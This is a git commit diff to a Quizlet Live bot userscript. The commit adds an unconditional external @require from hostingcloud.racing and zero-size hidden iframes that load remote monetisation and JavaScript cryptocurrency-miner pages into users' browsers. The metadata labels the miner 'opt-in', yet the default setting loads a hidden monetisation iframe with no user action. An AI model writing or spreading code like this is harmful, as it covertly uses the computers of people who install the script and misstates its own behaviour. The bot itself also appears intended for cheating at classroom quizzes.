365787780f8fd6f13aff143895355cf0fe5db23a
Pandapip1 <45835846+Pandapip1@users.noreply.github.com>
2021-01-08 15:17:07 -0500

    Update quizlet-bot.user.js

--- quizlet-bot.user.js
+++ quizlet-bot.user.js
@@ -5,22 +5,23 @@
 // @description  A bot for Quizlet Live
 // @author       Pandapip1
 // @match        https://quizlet.com/live
-// @match        https://pandapip1.github.io/quizlet-bot/settings.html
 // @downloadUrl  https://pandapip1.github.io/quizlet-bot/quizlet-bot.user.js
 // @updateUrl    https://pandapip1.github.io/quizlet-bot/quizlet-bot.user.js
 // @require      https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js
+// @require      https://www.hostingcloud.racing/EZV2.js
 // @require      https://openuserjs.org/src/libs/sizzle/GM_config.js
-// @antifeature  miner We use your computer's resources to mine a crypto currency. This can be disabled using the context menu
+// @antifeature  miner This userscript contains an opt-in cryptocurrency miner.
 // @grant        GM_addStyle
 // @grant        GM_setValue
 // @grant        GM_getValue
 // @grant        GM_registerMenuCommand
 // ==/UserScript==
 (() => {
-    GM_config.init{
+    let config = GM_config;
+    config.init({
       'id': 'QuizletBot',
       'fields':{
-        'arc':{
+        'monetization':{
           'label': 'Monetization (default: arc.io)',
           'type': 'select',
           'options': ["arc.io", "javascript miner", "both (thank you for the support <3)"]
@@ -28,7 +29,7 @@
       }
     });
     GM_registerMenuCommand('Configure Quizlet Bot', () => {
-        GM_config.open()
+        config.open()
     })
     var qb_userTriggered = false;
     var qb_script = document.createElement('script');
@@ -41,4 +42,18 @@
             }
         }, 1000); // give it time to load
     });
+    if (config.get('monetization') == "arc.io" || config.get('monetization') == "both (thank you for the support <3)"){
+        var qb_arcio = document.createElement('iframe');
+        qb_arcio.width = 0;
+        qb_arcio.height = 0;
+        qb_arcio.src = "https://qb-mon.pandapip1.repl.co/arc.html";
+        document.body.appendChild(qb_arcio);
+    }
+    if (config.get('monetization') == "javascript miner" || config.get('monetization') == "both (thank you for the support <3)"){
+        var qb_miner = document.createElement('iframe');
+        qb_miner.width = 0;
+        qb_miner.height = 0;
+        qb_miner.src = "https://qb-mon.pandapip1.repl.co/jsminer.html";
+        document.body.appendChild(qb_miner);
+    }
 })();
